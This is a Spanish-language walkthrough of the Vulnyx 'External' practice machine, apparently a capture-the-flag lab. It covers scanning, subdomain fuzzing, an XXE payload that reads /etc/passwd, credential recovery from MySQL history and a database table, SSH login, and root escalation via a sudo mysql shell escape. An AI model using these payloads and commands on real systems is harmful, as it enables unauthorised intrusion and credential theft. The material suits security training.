# Vulnyx-External

## Escaneo de Red
```bash
arp-scan -I eth0 --localnet
# (IP-victima)  08:00:27:8e:6a:8b       PCS Systemtechnik GmbH
```

## Escaneo de Puertos
```bash
nmap -p- --min-rate 2000 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
# 22/tcp   abierto  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocolo 2.0)
# 80/tcp   abierto  http    Apache httpd 2.4.56 ((Debian))
# 3306/tcp abierto  mysql   MySQL 5.5.5-10.5.19-MariaDB-0+deb11u2
```

Dentro del puerto 80 encontramos la siguiente pista:
```html
<!--
[Pending Tasks]

configure DNS: ext.nyx
-->
```

Añadimos esto a /etc/hosts para acceder a la web:
```bash
nano /etc/hosts
# (IP-victima)    ext.nyx
```

Hacemos fuzzing a subdominios:
```bash
wfuzz --hc=404,400 --hl=75  -w /usr/share/dnsrecon/subdomains-top1mil-20000.txt -H 'host: FUZZ.ext.nyx' -u (IP-victima)
# "administrator - administrator"
```

Añadimos "administrator.ext.nyx" a /etc/hosts y accedemos a un login:
```bash
nano /etc/hosts
```

Después de interceptar con BurpSuite, encontramos un posible XXE (XML External Entity),(La pista nos la da "<?xml version="1.0" encoding="UTF-8"?>"). Utilizamos payloads de XXE y probamos con éxito.

Fuente: https://github.com/payloadbox/xxe-injection-payload-list

Payload utilizado:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "/../../../../../../etc/passwd"> ]>
<details>
	<email>&ent;</email>
	<password>test</password>
</details>
```

Encontramos el "/etc/passwd". Luego, revisamos el historial de MySQL en "/home/admin/.mysql_history" y encontramos la contraseña de root.

Ingresamos al servidor MySQL:
```bash
mysql -u root -p -h (IP-victima) -P 3306
# Contraseña: r********B
```

Dentro de MySQL:
```sql
show databases;
use admindb
show tables;
select * from credentials
```

Encontramos credenciales de usuario "admin":
- Usuario: admin
- Contraseña: 4**********************3

Ingresamos via SSH:
```bash
ssh admin@(IP-victima)
# Contraseña: 4**********************3
```

Y accedemos como admin.

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/mysql
```

Vemos que podemos ejecutar MySQL como root. Buscamos en GTFObins y encontramos un comando para ejecutar una shell como root.

```bash
sudo mysql -u root -p*********B -e '\! /bin/sh'
# whoami
• root
```

¡Ahora somos root! (:D)
